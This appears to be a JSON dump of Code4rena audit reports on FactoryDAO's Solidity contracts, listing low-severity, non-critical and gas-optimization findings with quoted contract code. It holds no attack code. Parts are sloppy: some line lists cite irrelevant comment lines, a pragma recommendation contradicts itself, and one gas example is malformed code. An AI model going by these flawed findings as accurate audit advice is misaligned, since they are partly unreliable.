    "body": "# ISSUE LIST\n\n## C4-001 : Missing events for only functions that change critical parameters - Non Critical\n## C4-002 : Critical changes should use two-step procedure - Non Critical\n## C4-003 : Pragma Version - Non Critical\n## C4-004 : Missing zero-address check in the setter functions and initiliazers - Low\n## C4-005 : Typo On The Variable - Non Critical\n## C4-006 : Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom - Non critical\n## C4-007 : Deposit Token And Reward Token Should Not Be Same - LOW\n\n\n\n# ISSUES\n\n# C4-001 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L314\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n\n# C4-002 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/VoterID.sol#L151\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-003 : # Pragma Version\n\n## Impact\n\nIn the contracts, there are multiple version of pragmas are used. Some of them is used with 0.8.12 and some of them are 0.8.9. The contracts should be deployed with the consistent pragma.\n\n## ## Proof of Concept\n\nhttps://swcregistry.io/docs/SWC-103\n\n```\nAll Contracts\n```\n\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\nLock the pragma version: delete pragma solidity 0.8.10 in favor of pragma solidity 0.8.10.\n\n\n# C4-004 : # Missing zero-address check in the setter functions and initiliazers\n\n## Impact\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L75\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/VoterID.sol#L108\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol#L52\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol#L60\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol#L67\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol#L75\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-005 : # Typo On The Variables\n\n## Impact\n\nDuring the code review, It has been observed that parameters are mistakenly named as \"ooner\",\"sywol\" instead of \"owner\" and \"symbol\".\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/VoterID.sol#L109\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/VoterID.sol#L183\n```\n\n```\n\n        _owner_ = ooner; //owner\n        // we set it here with no resetting allowed so we cannot commit to NFTs and then reset\n        _minter = minter;\n        _name = nomen; //name\n        _symbol = symbowl; //symbol\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to fix typos.\n\n\n# C4-006 : Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n## Impact -  NON-CRITICAL\n\n## Impact\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\n contracts/MerkleDropFactory.sol::77 => require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n  contracts/MerkleDropFactory.sol::107 => require(IERC20(tree.tokenAddress).transfer(destination, value), \"ERC20 transfer failed\");\n  contracts/MerkleResistor.sol::121 => require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n  contracts/MerkleResistor.sol::204 => require(IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal), 'Token transfer failed');\n  contracts/MerkleVesting.sol::89 => require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n  contracts/MerkleVesting.sol::173 => IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal);\n  contracts/PermissionlessBasicPoolFactory.sol::144 => success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n  contracts/PermissionlessBasicPoolFactory.sol::198 => bool success = IERC20(pool.depositToken).transferFrom(msg.sender, address(this), amount);\n  contracts/PermissionlessBasicPoolFactory.sol::230 => success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n  contracts/PermissionlessBasicPoolFactory.sol::233 => success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);\n  contracts/PermissionlessBasicPoolFactory.sol::252 => success = success && IERC20(pool.rewardTokens[i]).transfer(pool.excessBeneficiary, rewards);\n  contracts/PermissionlessBasicPoolFactory.sol::269 => success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n\n# C4-007 : Deposit Token And Reward Token Should Not Be Same\n\n## Impact -  LOW\n\n## Impact\n\nDuring the code review, It has been noticed that to the contract is missing some sanity checks in the addPool function. When adding pool, deposit and reward token can be same and that can create unfair situation on the contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. The contract allows to be same on the deposit and reward tokens.\n```\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L108\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nDo not allow reward tokens are same as deposit Token. \n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/273"
    }
  },
  {
    "title": "QA Report",
    "body": "# Doc Issues\n\n## Missing critical docs\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L92\n\nThe docs should mention that this only supports ERC20 tokens with 18 decimals. Otherwise the contract will malfunction because `getRewards` assumes it.\n\n## Typos\n\n`metadataed`\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L8",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/265"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": " # ISSUE LIST\n\n## C4-001: Revert String Size Optimization\n## C4-002 : Adding unchecked directive can save gas\n## C4-003 : Check if amount > 0 before token transfer can save gas\n## C4-004 : There is no need to assign default values to variables\n## C4-005: `> 0 can be replaced with != 0 for gas optimization`\n## C4-006 : Free gas savings for using solidity 0.8.10+\n## C4-007 : ++i is more gas efficient than i++ in loops forwarding\n## C4-008 : Using operator && used more gas\n## C4-009 : Non-strict inequalities are cheaper than strict ones\n## C4-010 : Use Custom Errors instead of Revert Strings to save Gas\n\n# C4-001: Revert String Size Optimization\n\n## Impact\n\nShortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\n\n## Proof of Concept\n\nRevert strings > 32 bytes are here:\n\n```\n  contracts/MerkleDropFactory.sol::90 => require(treeIndex <= numTrees, \"Provided merkle index doesn't exist\");\n  contracts/MerkleDropFactory.sol::92 => require(!withdrawn[destination][treeIndex], \"You have already withdrawn your entitled token.\");\n  contracts/MerkleIdentity.sol::127 => require(verifyMetadata(tree.metadataMerkleRoot, tokenId, uri, metadataProof), \"The metadata proof could not be verified\");\n  contracts/MerkleResistor.sol::171 => require(initialized[destination][treeIndex], \"You must initialize your account first.\");\n  contracts/MerkleVesting.sol::141 => require(initialized[destination][treeIndex], \"You must initialize your account first.\");\n  contracts/VoterID.sol::5 => import \"../interfaces/IERC721Receiver.sol\";\n  contracts/VoterID.sol::37 => // Equals to `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n  contracts/VoterID.sol::210 => ///  `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n  contracts/VoterID.sol::217 => require(checkOnERC721Received(from, to, tokenId, data), \"Identity: transfer to non ERC721Receiver implementer\");\n  contracts/VoterID.sol::305 => require(owners[tokenId] == from, \"Identity: Transfer of token that is not own\");\n  contracts/VoterID.sol::306 => require(to != address(0), \"Identity: transfer to the zero address\");\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nShorten the revert strings to fit in 32 bytes. That will affect gas optimization.\n\n# C4-002 : Adding unchecked directive can save gas\n\n## Impact\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\n## Proof of Concept\n\n```\n  contracts/MerkleLib.sol::22 => for (uint i = 0; i < proof.length; i += 1) {\n  contracts/MerkleResistor.sol::40 => uint minEndTime; // minimum length (offset, not absolute) of vesting schedule in seconds\n  contracts/MerkleResistor.sol::41 => uint maxEndTime; // maximum length (offset, not absolute) of vesting schedule in seconds\n  contracts/MerkleResistor.sol::130 => /// @param vestingTime the actual length of the vesting schedule, chosen by the user\n  contracts/MerkleResistor.sol::211 => /// @param vestingTime user chosen length of vesting schedule\n  contracts/MerkleResistor.sol::243 => // x axis = length of vesting schedule\n  contracts/PermissionlessBasicPoolFactory.sol::112 => require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n  contracts/PermissionlessBasicPoolFactory.sol::115 => for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::141 => for (uint i = 0; i < pool.rewardFunding.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::167 => uint[] memory rewardsLocal = new uint[](pool.rewardsWeiPerSecondPerToken.length);\n  contracts/PermissionlessBasicPoolFactory.sol::168 => for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::224 => for (uint i = 0; i < rewards.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::249 => for (uint i = 0; i < pool.rewardTokens.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::266 => for (uint i = 0; i < pool.rewardTokens.length; i++) {\n\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider applying unchecked arithmetic where overflow/underflow is not possible. Example can be seen from below.\n\n```\nUnchecked{i++};\n```\n\n# C4-003 : Check if amount > 0 before token transfer can save gas\n\n## Impact\n\nSince _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.\n\n## Proof of Concept\n\n```\n  contracts/MerkleDropFactory.sol::77 => require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n  contracts/MerkleDropFactory.sol::107 => require(IERC20(tree.tokenAddress).transfer(destination, value), \"ERC20 transfer failed\");\n  contracts/MerkleResistor.sol::121 => require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n  contracts/MerkleResistor.sol::204 => require(IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal), 'Token transfer failed');\n  contracts/MerkleVesting.sol::89 => require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n  contracts/MerkleVesting.sol::173 => IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal);\n  contracts/PermissionlessBasicPoolFactory.sol::144 => success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n  contracts/PermissionlessBasicPoolFactory.sol::198 => bool success = IERC20(pool.depositToken).transferFrom(msg.sender, address(this), amount);\n  contracts/PermissionlessBasicPoolFactory.sol::230 => success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n  contracts/PermissionlessBasicPoolFactory.sol::233 => success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);\n  contracts/PermissionlessBasicPoolFactory.sol::252 => success = success && IERC20(pool.rewardTokens[i]).transfer(pool.excessBeneficiary, rewards);\n  contracts/PermissionlessBasicPoolFactory.sol::269 => success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n\n```\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider checking amount != 0.\n\n# C4-004 : There is no need to assign default values to variables\n\n## Impact -  Gas Optimization\n\nWhen a variable is declared solidity assigns the default value. In case the contract assigns the value again, it costs extra gas.\n\nExample: uint x = 0 costs more gas than uint x without having any different functionality.\n\n## Proof of Concept\n\n```\n  contracts/MerkleLib.sol::22 => for (uint i = 0; i < proof.length; i += 1) {\n  contracts/MerkleResistor.sol::40 => uint minEndTime; // minimum length (offset, not absolute) of vesting schedule in seconds\n  contracts/MerkleResistor.sol::41 => uint maxEndTime; // maximum length (offset, not absolute) of vesting schedule in seconds\n  contracts/MerkleResistor.sol::130 => /// @param vestingTime the actual length of the vesting schedule, chosen by the user\n  contracts/MerkleResistor.sol::211 => /// @param vestingTime user chosen length of vesting schedule\n  contracts/MerkleResistor.sol::243 => // x axis = length of vesting schedule\n  contracts/PermissionlessBasicPoolFactory.sol::112 => require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n  contracts/PermissionlessBasicPoolFactory.sol::115 => for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::141 => for (uint i = 0; i < pool.rewardFunding.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::167 => uint[] memory rewardsLocal = new uint[](pool.rewardsWeiPerSecondPerToken.length);\n  contracts/PermissionlessBasicPoolFactory.sol::168 => for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::224 => for (uint i = 0; i < rewards.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::249 => for (uint i = 0; i < pool.rewardTokens.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::266 => for (uint i = 0; i < pool.rewardTokens.length; i++) {\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nuint x = 0 costs more gas than uint x without having any different functionality.\n\n# C4-005: `> 0 can be replaced with != 0 for gas optimization`\n\n## Impact\n\n`!= 0` is a cheaper operation compared to `> 0`, when dealing with uint. (Before Pragma 0.8.13)\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  contracts/FixedPricePassThruGate.sol::51 => if (msg.value > 0) {\n  contracts/MerkleResistor.sol::156 => startTime,     // start time will usually be in the past, if pctUpFront > 0\n  contracts/SpeedBumpPriceGate.sol::77 => if (msg.value > 0) {\n  contracts/VoterID.sol::52 => *     => 0x70a08231 ^ 0x6352211e ^ 0x095ea7b3 ^ 0x081812fc ^\n  contracts/VoterID.sol::208 => ///  checks if `to` is a smart contract (code size > 0). If so, it calls\n  contracts/VoterID.sol::348 => return size > 0;\n\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse \"!=0\" instead of \">0\" for the gas optimization.\n\n# C4-006 : Free gas savings for using solidity 0.8.10+\n\n## Impact\n\nUsing newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.\n\n## Proof of Concept\n\n```\nAll Contracts\n```\n\n\nSolidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/\n\nSolidity 0.8.13 has some improvements too but not well tested.\n\nCode Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to upgrade pragma to at least 0.8.10.\n\n\n# C4-007 : ++i is more gas efficient than i++ in loops forwarding\n\n## Impact\n\n++i is more gas efficient than i++ in loops forwarding.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  contracts/PermissionlessBasicPoolFactory.sol::115 => for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::141 => for (uint i = 0; i < pool.rewardFunding.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::168 => for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::224 => for (uint i = 0; i < rewards.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::249 => for (uint i = 0; i < pool.rewardTokens.length; i++) {\n  contracts/PermissionlessBasicPoolFactory.sol::266 => for (uint i = 0; i < pool.rewardTokens.length; i++) {\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nIt is  recommend to use unchecked{++i} and change i declaration to uint256.\n\n\n# C4-008 : Using operator && used more gas\n\n## Impact\n\nUsing double require instead of operator && can save more gas.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  contracts/PermissionlessBasicPoolFactory.sol::144 => success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n  contracts/PermissionlessBasicPoolFactory.sol::198 => bool success = IERC20(pool.depositToken).transferFrom(msg.sender, address(this), amount);\n  contracts/PermissionlessBasicPoolFactory.sol::230 => success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n  contracts/PermissionlessBasicPoolFactory.sol::233 => success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);\n  contracts/PermissionlessBasicPoolFactory.sol::252 => success = success && IERC20(pool.rewardTokens[i]).transfer(pool.excessBeneficiary, rewards);\n  contracts/PermissionlessBasicPoolFactory.sol::269 => success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nExample\n\n```\n\nusing &&:\n\nfunction check(uint x)public view{\n   require(x == 0 && x < 1 );\n}\n// gas cost 21630\n\nusing double require:\n\n   require(x == 0 );\n   require( x < 1);\n   }\n}\n// gas cost 21622\n```\n\n\n# C4-009 : Non-strict inequalities are cheaper than strict ones\n\n## Impact\n\nStrict inequalities add a check of non equality which costs around 3 gas.\n\n## Proof of Concept\n\n```\n  contracts/FixedPricePassThruGate.sol::51 => if (msg.value > 0) {\n  contracts/MerkleResistor.sol::156 => startTime,     // start time will usually be in the past, if pctUpFront > 0\n  contracts/SpeedBumpPriceGate.sol::77 => if (msg.value > 0) {\n  contracts/VoterID.sol::52 => *     => 0x70a08231 ^ 0x6352211e ^ 0x095ea7b3 ^ 0x081812fc ^\n  contracts/VoterID.sol::208 => ///  checks if `to` is a smart contract (code size > 0). If so, it calls\n  contracts/VoterID.sol::348 => return size > 0;\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse >= or <= instead of > and < when possible.\n\n\n# C4-010 : Use Custom Errors instead of Revert Strings to save Gas\n\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource Custom Errors in Solidity:\n\nStarting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\nAll require Statements\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nRecommended to replace revert strings with custom errors.",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/258"
    }
  },
  {
    "title": "QA Report",
    "body": "## QA (LOW RISK & NON-CRITICAL)\n\n* The ERC20.transfer() and ERC20.transferFrom() functions return a boolean value indicating success. This parameter needs to be checked for success.\nFurthermore, some tokens (like USDT) don't correctly implement the ERC20 standard and don't return a boolean.Return values of the transfers are not checked in below LOC's.\n\n `IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal);` MerkleVesting.sol#L173\n `success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);` PermissionlessBasicPoolFactory.sol#L144\n `success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);` PermissionlessBasicPoolFactory.sol#L230\n `success = success && IERC20(pool.depositToken).transfer(receipt.owner, receipt.amountDepositedWei);` PermissionlessBasicPoolFactory.sol#L233\n `success = success && IERC20(pool.rewardTokens[i]).transfer(pool.excessBeneficiary, rewards);` PermissionlessBasicPoolFactory.sol#L252\n `success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);` PermissionlessBasicPoolFactory.sol#L269\n\n* `.transfer` is used for transferring ether. It is no longer recommended as recipients with custom fallback functions (smart contracts) will not be able to handle that. [Reference](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) \n\n* FixedPricePassThruGate.sol doesn't have function to receive ether/funds.\n* FixedPricePassThruGate.sol, `addGate() `function doesn't check address(0) for `_beneficiary` parameter which can lead the funds to burn.\n* At FixedPricePassThruGate.sol, `passThruGate()` function did not explicitly state the input variables and NatSpec is not sufficient for this function;\n  ```solidity\n   function passThruGate(uint index, address) override external payable {\n  ```\n* At FixedPricePassThruGate.sol, anyone can add arbitrary amount of gates including attacker's address as beneficiary by addGate() function. Thus, this leads to creating other attack surfaces like phishing. The contract should have strict control of creating gates like no duplicate gates should be allowed with same beneficiary address.\n  \n* At FixedPricePassThruGate.sol, `data` variable is not used and the best practice is to remove unused variables\n[Reference](https://swcregistry.io/docs/SWC-131) \n```solidity\n (bool sent, bytes memory data) = gate.beneficiary.call{value: gate.ethCost}(\"\");\n ```\n\n* At MerkleEligibility.sol, there is no address(0) check at the constructor function for `_gateMaster`\n\n* At MerkleEligibility.sol, named return and returned variable is not matching;\n```solidity\n    function addGate(bytes32 merkleRoot, uint maxWithdrawalsAddress, uint maxWithdrawalsTotal) external returns (uint index) {\n        // increment the number of roots\n        numGates += 1;\n\n        gates[numGates] = Gate(merkleRoot, maxWithdrawalsAddress, maxWithdrawalsTotal, 0);\n        return numGates;\n    }\n```\n* At MerkleEligibility.sol, `isEligible()` function, to reach the boundry, the logic should be;\n```solidity\nbool countValid = timesWithdrawn[index][recipient] <= gate.maxWithdrawalsAddress;\n```\ninstead of;\n```solidity\nbool countValid = timesWithdrawn[index][recipient] < gate.maxWithdrawalsAddress;\n```\n\n* At MerkleIdentity.sol, constructor function, there is no address(0) check for `_mgmt` parameter and for setManagement() function, no address(0) check for `newMgmt`. It's recommended that the setManagement function is not handled in one step. The team might consider to use Ownable.sol of Open Zeppelin.\n\n* At MerkleIdentity.sol, for setTreeAdder() function, no address(0) check for `newAdder`. It's recommended that the setTreeAdder function is not handled in one step. The team might consider to use Ownable.sol of Open Zeppelin.\n\n* At MerkleIdentity.sol, setIpfsHash() function, there is no 0 value check for both the parameters.\n  \n* At MerkleIdentity.sol, addMerkleTree() function, there is no 0 value and address(0) check for the parameters.\n\n* At PermissionlessBasicPoolFactory.sol, costly operations used inside a loop which might lead to an out-of-gas.\nAt addPool();\n ```solidity\nfor (uint i = 0; i < rewardTokenAddresses.length; i++) {\n            pool.rewardTokens.push(rewardTokenAddresses[i]);\n            pool.rewardsWeiClaimed.push(0);\n            pool.rewardFunding.push(0);\n            taxes[numPools].push(0);\n        }\n ```\n```solidity\nfunction fundPool(uint poolId) internal {\n        Pool storage pool = pools[poolId];\n        bool success = true;\n        uint amount;\n        for (uint i = 0; i < pool.rewardFunding.length; i++) {\n            amount = getMaximumRewards(poolId, i);\n            // transfer the tokens from pool-creator to this contract\n            success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n            // bookkeeping to make sure pools don't share tokens\n            pool.rewardFunding[i] += amount;\n        }\n        require(success, 'Token deposits failed');\n    }\n```\nAt withdraw();\n```solidity\nfor (uint i = 0; i < rewards.length; i++) {\n            pool.rewardsWeiClaimed[i] += rewards[i];\n            pool.rewardFunding[i] -= rewards[i];\n            uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n            uint transferAmount = rewards[i] - tax;\n            taxes[poolId][i] += tax;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n        }\n```\n```solidity\nfunction withdrawTaxes(uint poolId) external {\n        Pool storage pool = pools[poolId];\n        require(pool.id == poolId, 'Uninitialized pool');\n\n        bool success = true;\n        for (uint i = 0; i < pool.rewardTokens.length; i++) {\n            uint tax = taxes[poolId][i];\n            taxes[poolId][i] = 0;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n        }\n        require(success, 'Token transfer failed');\n    }\n```\n\n* At PermissionlessBasicPoolFactory.sol, there has been calls inside a loop which may end up wit DoS.\n[Reference](https://swcregistry.io/docs/SWC-113)\n\n```solidity\nfunction fundPool(uint poolId) internal {\n        Pool storage pool = pools[poolId];\n        bool success = true;\n        uint amount;\n        for (uint i = 0; i < pool.rewardFunding.length; i++) {\n            amount = getMaximumRewards(poolId, i);\n            // transfer the tokens from pool-creator to this contract\n            success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n            // bookkeeping to make sure pools don't share tokens\n            pool.rewardFunding[i] += amount;\n        }\n        require(success, 'Token deposits failed');\n    }\n```\n```solidity\nfunction withdraw(uint poolId, uint receiptId) external {\n        Pool storage pool = pools[poolId];\n        require(pool.id == poolId, 'Uninitialized pool');\n        Receipt storage receipt = pool.receipts[receiptId];\n        require(receipt.id == receiptId, 'Can only withdraw real receipts');\n        require(receipt.owner == msg.sender || block.timestamp > pool.endTime, 'Can only withdraw your own deposit');\n        require(receipt.timeWithdrawn == 0, 'Can only withdraw once per receipt');\n\n        // close re-entry gate\n        receipt.timeWithdrawn = block.timestamp;\n\n        uint[] memory rewards = getRewards(poolId, receiptId);\n        pool.totalDepositsWei -= receipt.amountDepositedWei;\n        bool success = true;\n\n        for (uint i = 0; i < rewards.length; i++) {\n            pool.rewardsWeiClaimed[i] += rewards[i];\n            pool.rewardFunding[i] -= rewards[i];\n            uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n            uint transferAmount = rewards[i] - tax;\n            taxes[poolId][i] += tax;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);\n        }\n```\n```solidity\nfunction withdrawExcessRewards(uint poolId) external {\n        Pool storage pool = pools[poolId];\n        require(pool.id == poolId, 'Uninitialized pool');\n        require(pool.totalDepositsWei == 0, 'Cannot withdraw until all deposits are withdrawn');\n        require(block.timestamp > pool.endTime, 'Contract must reach maturity');\n\n        bool success = true;\n        for (uint i = 0; i < pool.rewardTokens.length; i++) {\n            uint rewards = pool.rewardFunding[i];\n            pool.rewardFunding[i] = 0;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(pool.excessBeneficiary, rewards);\n        }\n        require(success, 'Token transfer failed');\n        emit ExcessRewardsWithdrawn(poolId);\n    }\n```\n```solidity\nunction withdrawTaxes(uint poolId) external {\n        Pool storage pool = pools[poolId];\n        require(pool.id == poolId, 'Uninitialized pool');\n\n        bool success = true;\n        for (uint i = 0; i < pool.rewardTokens.length; i++) {\n            uint tax = taxes[poolId][i];\n            taxes[poolId][i] = 0;\n            success = success && IERC20(pool.rewardTokens[i]).transfer(globalBeneficiary, tax);\n        }\n        require(success, 'Token transfer failed');\n    }\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
